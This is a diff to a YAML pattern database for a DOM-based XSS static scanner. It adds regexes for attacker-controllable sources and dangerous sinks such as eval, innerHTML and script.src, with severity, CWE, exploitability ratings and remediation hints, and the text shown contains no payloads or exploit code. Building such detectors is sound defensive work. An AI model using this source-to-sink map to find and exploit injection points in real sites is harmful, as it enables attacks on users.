@@ -1,366 +1,1078 @@
-# DOM XSS Pattern Database
-# This file contains patterns for detecting DOM-based XSS vulnerabilities
-# Add new patterns here to extend detection capabilities
+# ============================================================================
+# DOM XSS Pattern Database v2.0 - COMPREHENSIVE EDITION
+# ============================================================================
+# This file contains exhaustive patterns for detecting DOM-based XSS
+# vulnerabilities through static analysis of JavaScript/HTML code.
+#
+# Pattern Categories:
+# - Sources: Entry points where attacker-controlled data enters the application
+# - Sinks: Dangerous functions that can execute code or inject content
+# - Sanitizers: Functions that may neutralize XSS payloads
+# - Frameworks: Detection patterns for JavaScript frameworks
+# - Payloads: Test vectors for active scanning
+#
+# Severity Levels:
+# - CRITICAL: Direct code execution (eval, Function)
+# - HIGH: HTML injection (innerHTML, document.write)
+# - MEDIUM: Potential injection depending on context
+# - LOW: Requires specific conditions to exploit
+# - INFO: Informational, may indicate attack surface
+#
+# Last Updated: 2026-02-04
+# ============================================================================
 
-version: "1.0"
+version: "2.0"
 last_updated: "2026-02-04"
+maintainer: "security-team"
 
-# Sources: Entry points where user-controlled data can enter the application
+# ============================================================================
+# SOURCES - Where user-controlled data enters the application
+# ============================================================================
 sources:
-  # URL-based sources
+
+  # ---------------------------------------------------------------------------
+  # URL-Based Sources (Most Common Attack Vector)
+  # ---------------------------------------------------------------------------
   - name: "location.hash"
     pattern: 'location\.hash'
-    description: "URL fragment identifier - commonly used in SPAs"
+    description: "URL fragment identifier (#) - bypasses server-side logging"
     severity: "INFO"
     category: "url"
+    exploitability: "HIGH"
+    notes: "Fragment is never sent to server, purely client-side"
 
   - name: "location.search"
     pattern: 'location\.search'
-    description: "URL query string"
+    description: "URL query string (?key=value)"
     severity: "INFO"
     category: "url"
+    exploitability: "HIGH"
 
   - name: "location.href"
-    pattern: 'location\.href'
-    description: "Full URL including protocol, host, path, and query"
+    pattern: 'location\.href(?!\s*=)'
+    description: "Full URL including all components"
     severity: "INFO"
     category: "url"
+    exploitability: "HIGH"
 
   - name: "location.pathname"
     pattern: 'location\.pathname'
     description: "URL path component"
     severity: "INFO"
     category: "url"
+    exploitability: "MEDIUM"
+
+  - name: "location.host"
+    pattern: 'location\.host(?:name)?'
+    description: "URL hostname (rarely exploitable)"
+    severity: "INFO"
+    category: "url"
+    exploitability: "LOW"
+
+  - name: "location.origin"
+    pattern: 'location\.origin'
+    description: "URL origin (protocol + host)"
+    severity: "INFO"
+    category: "url"
+    exploitability: "LOW"
+
+  - name: "location.protocol"
+    pattern: 'location\.protocol'
+    description: "URL protocol (http:, https:, javascript:)"
+    severity: "INFO"
+    category: "url"
+    exploitability: "LOW"
+
+  - name: "location.port"
+    pattern: 'location\.port'
+    description: "URL port number"
+    severity: "INFO"
+    category: "url"
+    exploitability: "LOW"
 
   - name: "document.URL"
     pattern: 'document\.URL'
     description: "Document URL property"
     severity: "INFO"
     category: "url"
+    exploitability: "HIGH"
 
   - name: "document.documentURI"
     pattern: 'document\.documentURI'
     description: "Document URI property"
     severity: "INFO"
     category: "url"
+    exploitability: "HIGH"
 
   - name: "document.baseURI"
     pattern: 'document\.baseURI'
     description: "Base URI of the document"
     severity: "INFO"
     category: "url"
+    exploitability: "MEDIUM"
 
   - name: "document.referrer"
     pattern: 'document\.referrer'
-    description: "Referring page URL"
+    description: "Referring page URL - can be attacker-controlled"
     severity: "INFO"
     category: "url"
+    exploitability: "HIGH"
 
+  - name: "document.domain"
+    pattern: 'document\.domain(?!\s*=)'
+    description: "Document domain property"
+    severity: "INFO"
+    category: "url"
+    exploitability: "LOW"
+
+  # ---------------------------------------------------------------------------
+  # URL Parsing APIs
+  # ---------------------------------------------------------------------------
+  - name: "URLSearchParams"
+    pattern: 'new\s+URLSearchParams\s*\('
+    description: "Modern URL parameter parsing API"
+    severity: "INFO"
+    category: "url-api"
+    exploitability: "HIGH"
+
+  - name: "URLSearchParams.get"
+    pattern: '\.searchParams\.get\s*\('
+    description: "Get specific URL parameter"
+    severity: "INFO"
+    category: "url-api"
+    exploitability: "HIGH"
+
+  - name: "URLSearchParams.getAll"
+    pattern: '\.searchParams\.getAll\s*\('
+    description: "Get all values for URL parameter"
+    severity: "INFO"
+    category: "url-api"
+    exploitability: "HIGH"
+
+  - name: "URL constructor"
+    pattern: 'new\s+URL\s*\([^)]*location'
+    description: "URL object created from location"
+    severity: "INFO"
+    category: "url-api"
+    exploitability: "HIGH"
+
+  - name: "URL.href"
+    pattern: '\.href(?=\s*[;,\)])'
+    description: "URL href property access"
+    severity: "INFO"
+    category: "url-api"
+    exploitability: "MEDIUM"
+
+  # ---------------------------------------------------------------------------
+  # Cookie Sources
+  # ---------------------------------------------------------------------------
   - name: "document.cookie"
     pattern: 'document\.cookie'
-    description: "Document cookies - can be controlled via Set-Cookie"
+    description: "Document cookies - can be set via Set-Cookie or JS"
     severity: "INFO"
     category: "cookie"
+    exploitability: "MEDIUM"
+    notes: "Requires ability to set cookies (CRLF injection, subdomain)"
 
-  # Window sources
+  # ---------------------------------------------------------------------------
+  # Window Sources
+  # ---------------------------------------------------------------------------
   - name: "window.name"
     pattern: 'window\.name'
-    description: "Window name - persistent across navigations"
+    description: "Window name - persists across navigations, attacker-controllable"
     severity: "INFO"
     category: "window"
+    exploitability: "HIGH"
+    notes: "Classic XSS vector - set via window.open or link target"
 
   - name: "window.location"
     pattern: 'window\.location(?!\s*=)'
     description: "Window location object"
     severity: "INFO"
-    category: "url"
+    category: "window"
+    exploitability: "HIGH"
 
-  # Storage sources
+  - name: "self.location"
+    pattern: 'self\.location'
+    description: "Self location reference"
+    severity: "INFO"
+    category: "window"
+    exploitability: "HIGH"
+
+  - name: "top.location"
+    pattern: 'top\.location'
+    description: "Top frame location"
+    severity: "INFO"
+    category: "window"
+    exploitability: "MEDIUM"
+
+  - name: "parent.location"
+    pattern: 'parent\.location'
+    description: "Parent frame location"
+    severity: "INFO"
+    category: "window"
+    exploitability: "MEDIUM"
+
+  - name: "frames[].location"
+    pattern: 'frames\s*\[[^\]]*\]\.location'
+    description: "Frame location access"
+    severity: "INFO"
+    category: "window"
+    exploitability: "MEDIUM"
+
+  # ---------------------------------------------------------------------------
+  # Storage Sources
+  # ---------------------------------------------------------------------------
   - name: "localStorage.getItem"
     pattern: 'localStorage\.getItem\s*\('
     description: "Local storage read"
     severity: "INFO"
     category: "storage"
+    exploitability: "MEDIUM"
+    notes: "Requires prior storage poisoning"
+
+  - name: "localStorage[]"
+    pattern: 'localStorage\s*\[\s*[''"`]'
+    description: "Local storage bracket notation"
+    severity: "INFO"
+    category: "storage"
+    exploitability: "MEDIUM"
+
+  - name: "localStorage direct"
+    pattern: 'localStorage\.[a-zA-Z_][a-zA-Z0-9_]*(?!\s*=)'
+    description: "Local storage direct property access"
+    severity: "INFO"
+    category: "storage"
+    exploitability: "MEDIUM"
 
   - name: "sessionStorage.getItem"
     pattern: 'sessionStorage\.getItem\s*\('
     description: "Session storage read"
     severity: "INFO"
     category: "storage"
-
-  - name: "localStorage[]"
-    pattern: 'localStorage\s*\['
-    description: "Local storage bracket access"
-    severity: "INFO"
-    category: "storage"
+    exploitability: "MEDIUM"
 
   - name: "sessionStorage[]"
-    pattern: 'sessionStorage\s*\['
-    description: "Session storage bracket access"
+    pattern: 'sessionStorage\s*\[\s*[''"`]'
+    description: "Session storage bracket notation"
     severity: "INFO"
     category: "storage"
+    exploitability: "MEDIUM"
 
-  # URL parsing
-  - name: "URLSearchParams"
-    pattern: 'URLSearchParams\s*\('
-    description: "URL search params parsing"
+  - name: "indexedDB"
+    pattern: 'indexedDB\.'
+    description: "IndexedDB access"
     severity: "INFO"
-    category: "url"
+    category: "storage"
+    exploitability: "LOW"
 
-  - name: "new URL()"
-    pattern: 'new\s+URL\s*\('
-    description: "URL constructor"
-    severity: "INFO"
-    category: "url"
-
-  - name: "url.searchParams.get"
-    pattern: '\.searchParams\.get\s*\('
-    description: "Search params getter"
-    severity: "INFO"
-    category: "url"
-
-  # Message sources
-  - name: "postMessage.data"
-    pattern: '\.data(?=.*message)'
-    description: "postMessage data property"
+  # ---------------------------------------------------------------------------
+  # Message Sources (postMessage)
+  # ---------------------------------------------------------------------------
+  - name: "message event data"
+    pattern: 'addEventListener\s*\(\s*[''"]message[''"]'
+    description: "postMessage event listener"
     severity: "INFO"
     category: "message"
+    exploitability: "HIGH"
+    notes: "Check for origin validation"
 
   - name: "event.data"
-    pattern: 'event\.data'
-    description: "Event data property"
+    pattern: '(?:event|e|evt|msg)\.data'
+    description: "Message event data property"
     severity: "INFO"
     category: "message"
+    exploitability: "HIGH"
 
-  - name: "e.data"
-    pattern: '\be\.data\b'
-    description: "Event data shorthand"
+  - name: "event.origin"
+    pattern: '(?:event|e|evt|msg)\.origin'
+    description: "Message event origin (should be validated)"
     severity: "INFO"
     category: "message"
+    exploitability: "INFO"
 
-  # Form/input sources
+  - name: "onmessage handler"
+    pattern: '\.onmessage\s*='
+    description: "Direct onmessage handler assignment"
+    severity: "INFO"
+    category: "message"
+    exploitability: "HIGH"
+
+  # ---------------------------------------------------------------------------
+  # Form/Input Sources
+  # ---------------------------------------------------------------------------
   - name: "input.value"
-    pattern: '\.value(?=.*input|.*text)'
+    pattern: '\.value(?=\s*[;,\)}\]])'
     description: "Input element value"
     severity: "INFO"
     category: "form"
+    exploitability: "MEDIUM"
+
+  - name: "textarea.value"
+    pattern: 'textarea[^.]*\.value'
+    description: "Textarea value"
+    severity: "INFO"
+    category: "form"
+    exploitability: "MEDIUM"
+
+  - name: "select.value"
+    pattern: 'select[^.]*\.value'
+    description: "Select element value"
+    severity: "INFO"
+    category: "form"
+    exploitability: "LOW"
 
   - name: "document.forms"
     pattern: 'document\.forms'
     description: "Document forms collection"
     severity: "INFO"
     category: "form"
+    exploitability: "MEDIUM"
 
-  # jQuery sources
+  - name: "FormData"
+    pattern: 'new\s+FormData\s*\('
+    description: "FormData object"
+    severity: "INFO"
+    category: "form"
+    exploitability: "MEDIUM"
+
+  - name: "form.elements"
+    pattern: '\.elements\s*\['
+    description: "Form elements access"
+    severity: "INFO"
+    category: "form"
+    exploitability: "MEDIUM"
+
+  # ---------------------------------------------------------------------------
+  # DOM Reading Sources
+  # ---------------------------------------------------------------------------
+  - name: "innerHTML read"
+    pattern: '=\s*[^=]*\.innerHTML(?!\s*=)'
+    description: "Reading innerHTML (potential DOM clobbering)"
+    severity: "INFO"
+    category: "dom"
+    exploitability: "LOW"
+
+  - name: "outerHTML read"
+    pattern: '=\s*[^=]*\.outerHTML(?!\s*=)'
+    description: "Reading outerHTML"
+    severity: "INFO"
+    category: "dom"
+    exploitability: "LOW"
+
+  - name: "textContent read"
+    pattern: '\.textContent(?!\s*=)'
+    description: "Reading textContent"
+    severity: "INFO"
+    category: "dom"
+    exploitability: "LOW"
+
+  - name: "innerText read"
+    pattern: '\.innerText(?!\s*=)'
+    description: "Reading innerText"
+    severity: "INFO"
+    category: "dom"
+    exploitability: "LOW"
+
+  - name: "getAttribute"
+    pattern: '\.getAttribute\s*\('
+    description: "Get element attribute"
+    severity: "INFO"
+    category: "dom"
+    exploitability: "MEDIUM"
+
+  - name: "dataset"
+    pattern: '\.dataset\.'
+    description: "Data attribute access"
+    severity: "INFO"
+    category: "dom"
+    exploitability: "MEDIUM"
+
+  - name: "attributes[]"
+    pattern: '\.attributes\s*\['
+    description: "Attributes collection access"
+    severity: "INFO"
+    category: "dom"
+    exploitability: "LOW"
+
+  # ---------------------------------------------------------------------------
+  # jQuery Sources
+  # ---------------------------------------------------------------------------
   - name: "$.param"
     pattern: '\$\.param\s*\('
     description: "jQuery param serialization"
     severity: "INFO"
     category: "jquery"
+    exploitability: "MEDIUM"
 
-  - name: ".val()"
+  - name: ".val() getter"
     pattern: '\.val\s*\(\s*\)'
     description: "jQuery value getter"
     severity: "INFO"
     category: "jquery"
+    exploitability: "MEDIUM"
 
-  - name: ".data()"
-    pattern: '\.data\s*\(\s*[''"]'
+  - name: ".data() getter"
+    pattern: '\.data\s*\(\s*[''"][^)]+[''"]?\s*\)'
     description: "jQuery data attribute getter"
     severity: "INFO"
     category: "jquery"
+    exploitability: "MEDIUM"
 
-  - name: ".attr()"
-    pattern: '\.attr\s*\(\s*[''"]'
+  - name: ".attr() getter"
+    pattern: '\.attr\s*\(\s*[''"][^)]+[''"]?\s*\)'
     description: "jQuery attribute getter"
     severity: "INFO"
     category: "jquery"
+    exploitability: "MEDIUM"
 
-  # Custom getters (common patterns)
+  - name: ".prop() getter"
+    pattern: '\.prop\s*\(\s*[''"][^)]+[''"]?\s*\)'
+    description: "jQuery property getter"
+    severity: "INFO"
+    category: "jquery"
+    exploitability: "MEDIUM"
+
+  - name: ".text() getter"
+    pattern: '\.text\s*\(\s*\)'
+    description: "jQuery text getter"
+    severity: "INFO"
+    category: "jquery"
+    exploitability: "LOW"
+
+  - name: "$.ajax success"
+    pattern: '\$\.ajax\s*\([^)]*success\s*:'
+    description: "jQuery AJAX response handler"
+    severity: "INFO"
+    category: "jquery"
+    exploitability: "MEDIUM"
+
+  - name: ".load() response"
+    pattern: '\.load\s*\(\s*[''"][^)]+[''"]'
+    description: "jQuery load response"
+    severity: "INFO"
+    category: "jquery"
+    exploitability: "MEDIUM"
+
+  - name: "$.get/$.post response"
+    pattern: '\$\.(get|post|getJSON)\s*\('
+    description: "jQuery AJAX shorthand"
+    severity: "INFO"
+    category: "jquery"
+    exploitability: "MEDIUM"
+
+  # ---------------------------------------------------------------------------
+  # Fetch/XHR Sources
+  # ---------------------------------------------------------------------------
+  - name: "fetch response"
+    pattern: 'fetch\s*\([^)]+\)\s*\.then'
+    description: "Fetch API response"
+    severity: "INFO"
+    category: "network"
+    exploitability: "MEDIUM"
+
+  - name: "XMLHttpRequest.response"
+    pattern: '\.response(?:Text|XML)?(?!\s*=)'
+    description: "XHR response data"
+    severity: "INFO"
+    category: "network"
+    exploitability: "MEDIUM"
+
+  - name: "response.json()"
+    pattern: '\.json\s*\(\s*\)'
+    description: "JSON response parsing"
+    severity: "INFO"
+    category: "network"
+    exploitability: "MEDIUM"
+
+  - name: "response.text()"
+    pattern: '\.text\s*\(\s*\)'
+    description: "Text response"
+    severity: "INFO"
+    category: "network"
+    exploitability: "MEDIUM"
+
+  # ---------------------------------------------------------------------------
+  # Custom/Common Getter Patterns
+  # ---------------------------------------------------------------------------
   - name: "getParameter"
     pattern: 'getParameter\s*\('
-    description: "Custom parameter getter"
+    description: "Custom parameter getter function"
     severity: "INFO"
     category: "custom"
+    exploitability: "HIGH"
 
   - name: "getParam"
     pattern: 'getParam\s*\('
     description: "Custom param getter"
     severity: "INFO"
     category: "custom"
-
-  - name: "getQuery"
-    pattern: 'getQuery\s*\('
-    description: "Custom query getter"
-    severity: "INFO"
-    category: "custom"
+    exploitability: "HIGH"
 
   - name: "getUrlParam"
     pattern: 'getUrlParam\s*\('
     description: "Custom URL param getter"
     severity: "INFO"
     category: "custom"
+    exploitability: "HIGH"
+
+  - name: "getQueryString"
+    pattern: 'getQueryString\s*\('
+    description: "Custom query string getter"
+    severity: "INFO"
+    category: "custom"
+    exploitability: "HIGH"
 
   - name: "getHashParam"
     pattern: 'getHashParam\s*\('
     description: "Custom hash param getter"
     severity: "INFO"
     category: "custom"
+    exploitability: "HIGH"
 
-# Sinks: Dangerous functions that can execute code or inject HTML
+  - name: "parseQueryString"
+    pattern: 'parseQueryString\s*\('
+    description: "Custom query parser"
+    severity: "INFO"
+    category: "custom"
+    exploitability: "HIGH"
+
+  - name: "parseUrl"
+    pattern: 'parseUrl\s*\('
+    description: "Custom URL parser"
+    severity: "INFO"
+    category: "custom"
+    exploitability: "HIGH"
+
+  - name: "decodeURIComponent"
+    pattern: 'decodeURIComponent\s*\('
+    description: "URL decoding - indicates URL param processing"
+    severity: "INFO"
+    category: "encoding"
+    exploitability: "MEDIUM"
+
+  - name: "decodeURI"
+    pattern: 'decodeURI\s*\('
+    description: "URI decoding"
+    severity: "INFO"
+    category: "encoding"
+    exploitability: "MEDIUM"
+
+  - name: "unescape"
+    pattern: 'unescape\s*\('
+    description: "Legacy URL unescaping (deprecated)"
+    severity: "INFO"
+    category: "encoding"
+    exploitability: "MEDIUM"
+
+  - name: "atob"
+    pattern: 'atob\s*\('
+    description: "Base64 decoding"
+    severity: "INFO"
+    category: "encoding"
+    exploitability: "LOW"
+
+  - name: "JSON.parse"
+    pattern: 'JSON\.parse\s*\('
+    description: "JSON parsing - check what's being parsed"
+    severity: "INFO"
+    category: "encoding"
+    exploitability: "LOW"
+
+# ============================================================================
+# SINKS - Dangerous functions that can execute code or inject content
+# ============================================================================
 sinks:
-  # HTML injection sinks - CRITICAL/HIGH
-  - name: "innerHTML="
+
+  # ---------------------------------------------------------------------------
+  # JavaScript Execution Sinks (CRITICAL)
+  # ---------------------------------------------------------------------------
+  - name: "eval"
+    pattern: '\beval\s*\('
+    description: "eval() - executes string as JavaScript code"
+    severity: "CRITICAL"
+    cwe: "CWE-95"
+    category: "code-execution"
+    remediation: "Never use eval with user input. Use JSON.parse for JSON data."
+
+  - name: "Function constructor"
+    pattern: '\bFunction\s*\('
+    description: "Function() constructor - creates function from string"
+    severity: "CRITICAL"
+    cwe: "CWE-95"
+    category: "code-execution"
+    remediation: "Avoid Function constructor with dynamic input."
+
+  - name: "new Function"
+    pattern: 'new\s+Function\s*\('
+    description: "new Function() - alternative function constructor"
+    severity: "CRITICAL"
+    cwe: "CWE-95"
+    category: "code-execution"
+    remediation: "Avoid Function constructor with dynamic input."
+
+  - name: "setTimeout string"
+    pattern: 'setTimeout\s*\(\s*[''"`]'
+    description: "setTimeout with string argument (implicit eval)"
+    severity: "CRITICAL"
+    cwe: "CWE-95"
+    category: "code-execution"
+    remediation: "Use function reference instead of string."
+
+  - name: "setTimeout variable"
+    pattern: 'setTimeout\s*\(\s*[a-zA-Z_$][a-zA-Z0-9_$]*\s*[,\)]'
+    description: "setTimeout with variable (check if string)"
+    severity: "HIGH"
+    cwe: "CWE-95"
+    category: "code-execution"
+    remediation: "Ensure variable is a function, not string."
+
+  - name: "setInterval string"
+    pattern: 'setInterval\s*\(\s*[''"`]'
+    description: "setInterval with string argument (implicit eval)"
+    severity: "CRITICAL"
+    cwe: "CWE-95"
+    category: "code-execution"
+    remediation: "Use function reference instead of string."
+
+  - name: "setInterval variable"
+    pattern: 'setInterval\s*\(\s*[a-zA-Z_$][a-zA-Z0-9_$]*\s*[,\)]'
+    description: "setInterval with variable"
+    severity: "HIGH"
+    cwe: "CWE-95"
+    category: "code-execution"
+
+  - name: "setImmediate string"
+    pattern: 'setImmediate\s*\(\s*[''"`]'
+    description: "setImmediate with string"
+    severity: "CRITICAL"
+    cwe: "CWE-95"
+    category: "code-execution"
+
+  - name: "execScript"
+    pattern: 'execScript\s*\('
+    description: "execScript (IE-specific, deprecated)"
+    severity: "CRITICAL"
+    cwe: "CWE-95"
+    category: "code-execution"
+
+  - name: "msSetImmediate"
+    pattern: 'msSetImmediate\s*\('
+    description: "msSetImmediate (IE-specific)"
+    severity: "HIGH"
+    cwe: "CWE-95"
+    category: "code-execution"
+
+  # ---------------------------------------------------------------------------
+  # HTML Injection Sinks (HIGH)
+  # ---------------------------------------------------------------------------
+  - name: "innerHTML"
     pattern: '\.innerHTML\s*='
-    description: "Direct HTML injection"
+    description: "innerHTML assignment - parses and executes HTML/scripts"
+    severity: "HIGH"
+    cwe: "CWE-79"
+    category: "html-injection"
+    remediation: "Use textContent for text, or sanitize HTML with DOMPurify."
+
+  - name: "innerHTML +="
+    pattern: '\.innerHTML\s*\+='
+    description: "innerHTML concatenation"
     severity: "HIGH"
     cwe: "CWE-79"
     category: "html-injection"
 
-  - name: "outerHTML="
+  - name: "outerHTML"
     pattern: '\.outerHTML\s*='
-    description: "Outer HTML injection"
+    description: "outerHTML assignment"
     severity: "HIGH"
     cwe: "CWE-79"
     category: "html-injection"
 
   - name: "insertAdjacentHTML"
     pattern: '\.insertAdjacentHTML\s*\('
-    description: "Adjacent HTML injection"
+    description: "insertAdjacentHTML - inserts HTML at specified position"
     severity: "HIGH"
+    cwe: "CWE-79"
+    category: "html-injection"
+    remediation: "Use insertAdjacentText or sanitize input."
+
+  - name: "insertAdjacentElement"
+    pattern: '\.insertAdjacentElement\s*\('
+    description: "insertAdjacentElement"
+    severity: "MEDIUM"
     cwe: "CWE-79"
     category: "html-injection"
 
   - name: "document.write"
     pattern: 'document\.write\s*\('
-    description: "Document write - can inject arbitrary HTML"
+    description: "document.write - writes to document stream"
     severity: "HIGH"
     cwe: "CWE-79"
     category: "html-injection"
+    remediation: "Avoid document.write entirely."
 
   - name: "document.writeln"
     pattern: 'document\.writeln\s*\('
-    description: "Document writeln"
+    description: "document.writeln - writes line to document"
     severity: "HIGH"
     cwe: "CWE-79"
     category: "html-injection"
 
-  # Script execution sinks - CRITICAL
-  - name: "eval"
-    pattern: '\beval\s*\('
-    description: "JavaScript eval - executes arbitrary code"
-    severity: "CRITICAL"
-    cwe: "CWE-95"
-    category: "code-execution"
-
-  - name: "Function"
-    pattern: '\bFunction\s*\('
-    description: "Function constructor - code execution"
-    severity: "CRITICAL"
-    cwe: "CWE-95"
-    category: "code-execution"
-
-  - name: "new Function"
-    pattern: 'new\s+Function\s*\('
-    description: "New Function constructor"
-    severity: "CRITICAL"
-    cwe: "CWE-95"
-    category: "code-execution"
-
-  - name: "setTimeout-string"
-    pattern: 'setTimeout\s*\(\s*[''"`]'
-    description: "setTimeout with string argument"
+  - name: "document.body.innerHTML"
+    pattern: 'document\.body\.innerHTML\s*='
+    description: "Body innerHTML assignment"
     severity: "HIGH"
-    cwe: "CWE-95"
-    category: "code-execution"
+    cwe: "CWE-79"
+    category: "html-injection"
 
-  - name: "setInterval-string"
-    pattern: 'setInterval\s*\(\s*[''"`]'
-    description: "setInterval with string argument"
+  - name: "document.head.innerHTML"
+    pattern: 'document\.head\.innerHTML\s*='
+    description: "Head innerHTML assignment"
     severity: "HIGH"
-    cwe: "CWE-95"
-    category: "code-execution"
+    cwe: "CWE-79"
+    category: "html-injection"
 
-  - name: "execScript"
-    pattern: 'execScript\s*\('
-    description: "execScript (IE-specific)"
-    severity: "CRITICAL"
-    cwe: "CWE-95"
-    category: "code-execution"
+  # ---------------------------------------------------------------------------
+  # DOM Manipulation Sinks
+  # ---------------------------------------------------------------------------
+  - name: "createElement script"
+    pattern: 'createElement\s*\(\s*[''"]script[''"]'
+    description: "Creating script element"
+    severity: "HIGH"
+    cwe: "CWE-79"
+    category: "dom-manipulation"
 
-  # jQuery sinks
+  - name: "createElement iframe"
+    pattern: 'createElement\s*\(\s*[''"]iframe[''"]'
+    description: "Creating iframe element"
+    severity: "MEDIUM"
+    cwe: "CWE-79"
+    category: "dom-manipulation"
+
+  - name: "createElement object"
+    pattern: 'createElement\s*\(\s*[''"]object[''"]'
+    description: "Creating object element"
+    severity: "MEDIUM"
+    cwe: "CWE-79"
+    category: "dom-manipulation"
+
+  - name: "createElement embed"
+    pattern: 'createElement\s*\(\s*[''"]embed[''"]'
+    description: "Creating embed element"
+    severity: "MEDIUM"
+    cwe: "CWE-79"
+    category: "dom-manipulation"
+
+  - name: "createContextualFragment"
+    pattern: 'createContextualFragment\s*\('
+    description: "Creating document fragment from HTML string"
+    severity: "HIGH"
+    cwe: "CWE-79"
+    category: "dom-manipulation"
+
+  - name: "Range.createContextualFragment"
+    pattern: '\.createContextualFragment\s*\('
+    description: "Range createContextualFragment"
+    severity: "HIGH"
+    cwe: "CWE-79"
+    category: "dom-manipulation"
+
+  - name: "DOMParser.parseFromString"
+    pattern: 'DOMParser[^.]*\.parseFromString\s*\('
+    description: "DOMParser parsing HTML"
+    severity: "MEDIUM"
+    cwe: "CWE-79"
+    category: "dom-manipulation"
+
+  - name: "document.implementation.createHTMLDocument"
+    pattern: 'createHTMLDocument\s*\('
+    description: "Creating HTML document"
+    severity: "MEDIUM"
+    cwe: "CWE-79"
+    category: "dom-manipulation"
+
+  # ---------------------------------------------------------------------------
+  # Attribute Manipulation Sinks
+  # ---------------------------------------------------------------------------
+  - name: "setAttribute on*"
+    pattern: 'setAttribute\s*\(\s*[''"]on[a-z]+'
+    description: "Setting event handler attribute"
+    severity: "HIGH"
+    cwe: "CWE-79"
+    category: "attribute"
+    remediation: "Use addEventListener instead of inline handlers."
+
+  - name: "setAttribute src"
+    pattern: 'setAttribute\s*\(\s*[''"]src[''"]'
+    description: "Setting src attribute"
+    severity: "MEDIUM"
+    cwe: "CWE-79"
+    category: "attribute"
+
+  - name: "setAttribute href"
+    pattern: 'setAttribute\s*\(\s*[''"]href[''"]'
+    description: "Setting href attribute"
+    severity: "MEDIUM"
+    cwe: "CWE-79"
+    category: "attribute"
+
+  - name: "setAttribute action"
+    pattern: 'setAttribute\s*\(\s*[''"]action[''"]'
+    description: "Setting form action"
+    severity: "MEDIUM"
+    cwe: "CWE-79"
+    category: "attribute"
+
+  - name: "setAttribute formaction"
+    pattern: 'setAttribute\s*\(\s*[''"]formaction[''"]'
+    description: "Setting formaction attribute"
+    severity: "MEDIUM"
+    cwe: "CWE-79"
+    category: "attribute"
+
+  - name: "setAttribute data"
+    pattern: 'setAttribute\s*\(\s*[''"]data[''"]'
+    description: "Setting object/embed data attribute"
+    severity: "MEDIUM"
+    cwe: "CWE-79"
+    category: "attribute"
+
+  - name: "setAttribute style"
+    pattern: 'setAttribute\s*\(\s*[''"]style[''"]'
+    description: "Setting style attribute (CSS injection)"
+    severity: "LOW"
+    cwe: "CWE-79"
+    category: "attribute"
+
+  - name: "setAttribute background"
+    pattern: 'setAttribute\s*\(\s*[''"]background[''"]'
+    description: "Setting background attribute"
+    severity: "LOW"
+    cwe: "CWE-79"
+    category: "attribute"
+
+  - name: "setAttributeNS"
+    pattern: 'setAttributeNS\s*\('
+    description: "Setting namespaced attribute"
+    severity: "MEDIUM"
+    cwe: "CWE-79"
+    category: "attribute"
+
+  - name: ".src ="
+    pattern: '\.src\s*='
+    description: "Direct src property assignment"
+    severity: "MEDIUM"
+    cwe: "CWE-79"
+    category: "attribute"
+
+  - name: ".href ="
+    pattern: '(?<!location)\.href\s*='
+    description: "Direct href property assignment"
+    severity: "MEDIUM"
+    cwe: "CWE-79"
+    category: "attribute"
+
+  - name: ".action ="
+    pattern: '\.action\s*='
+    description: "Form action assignment"
+    severity: "MEDIUM"
+    cwe: "CWE-79"
+    category: "attribute"
+
+  - name: ".srcdoc ="
+    pattern: '\.srcdoc\s*='
+    description: "iframe srcdoc assignment"
+    severity: "HIGH"
+    cwe: "CWE-79"
+    category: "attribute"
+
+  - name: ".data ="
+    pattern: '\.data\s*=\s*[^=]'
+    description: "object/embed data property"
+    severity: "MEDIUM"
+    cwe: "CWE-79"
+    category: "attribute"
+
+  # ---------------------------------------------------------------------------
+  # Script Loading Sinks
+  # ---------------------------------------------------------------------------
+  - name: "script.src ="
+    pattern: 'script[^.]*\.src\s*='
+    description: "Setting script source"
+    severity: "HIGH"
+    cwe: "CWE-79"
+    category: "script-loading"
+
+  - name: "script.text ="
+    pattern: 'script[^.]*\.text\s*='
+    description: "Setting script text content"
+    severity: "HIGH"
+    cwe: "CWE-79"
+    category: "script-loading"
+
+  - name: "script.textContent ="
+    pattern: 'script[^.]*\.textContent\s*='
+    description: "Setting script textContent"
+    severity: "HIGH"
+    cwe: "CWE-79"
+    category: "script-loading"
+
+  - name: "script.innerHTML ="
+    pattern: 'script[^.]*\.innerHTML\s*='
+    description: "Setting script innerHTML"
+    severity: "HIGH"
+    cwe: "CWE-79"
+    category: "script-loading"
+
+  - name: "import()"
+    pattern: '\bimport\s*\('
+    description: "Dynamic import"
+    severity: "HIGH"
+    cwe: "CWE-79"
+    category: "script-loading"
+
+  - name: "require()"
+    pattern: '\brequire\s*\([^)]*[+`$]'
+    description: "Dynamic require with variable"
+    severity: "HIGH"
+    cwe: "CWE-79"
+    category: "script-loading"
+
+  # ---------------------------------------------------------------------------
+  # jQuery Sinks
+  # ---------------------------------------------------------------------------
   - name: "$.html()"
-    pattern: '\.html\s*\([^)]+\)'
+    pattern: '\.html\s*\(\s*[^)\s]'
     description: "jQuery HTML setter"
     severity: "HIGH"
     cwe: "CWE-79"
     category: "jquery"
+    remediation: "Use .text() for text content or sanitize input."
 
   - name: "$.append()"
-    pattern: '\.append\s*\([^)]+\)'
-    description: "jQuery append"
+    pattern: '\.append\s*\(\s*[^)\s]'
+    description: "jQuery append - can accept HTML"
     severity: "MEDIUM"
     cwe: "CWE-79"
     category: "jquery"
 
   - name: "$.prepend()"
-    pattern: '\.prepend\s*\([^)]+\)'
+    pattern: '\.prepend\s*\(\s*[^)\s]'
     description: "jQuery prepend"
     severity: "MEDIUM"
     cwe: "CWE-79"
     category: "jquery"
 
   - name: "$.after()"
-    pattern: '\.after\s*\([^)]+\)'
+    pattern: '\.after\s*\(\s*[^)\s]'
     description: "jQuery after"
     severity: "MEDIUM"
     cwe: "CWE-79"
     category: "jquery"
 
   - name: "$.before()"
-    pattern: '\.before\s*\([^)]+\)'
+    pattern: '\.before\s*\(\s*[^)\s]'
     description: "jQuery before"
     severity: "MEDIUM"
     cwe: "CWE-79"
     category: "jquery"
 
   - name: "$.replaceWith()"
-    pattern: '\.replaceWith\s*\([^)]+\)'
+    pattern: '\.replaceWith\s*\(\s*[^)\s]'
     description: "jQuery replaceWith"
     severity: "MEDIUM"
     cwe: "CWE-79"
     category: "jquery"
 
   - name: "$.wrap()"
-    pattern: '\.wrap\s*\([^)]+\)'
+    pattern: '\.wrap\s*\(\s*[^)\s]'
     description: "jQuery wrap"
     severity: "MEDIUM"
     cwe: "CWE-79"
     category: "jquery"
 
-  - name: "$()-selector-concat"
-    pattern: '\$\s*\(\s*[''"`][^)]*\+'
-    description: "jQuery selector with string concatenation"
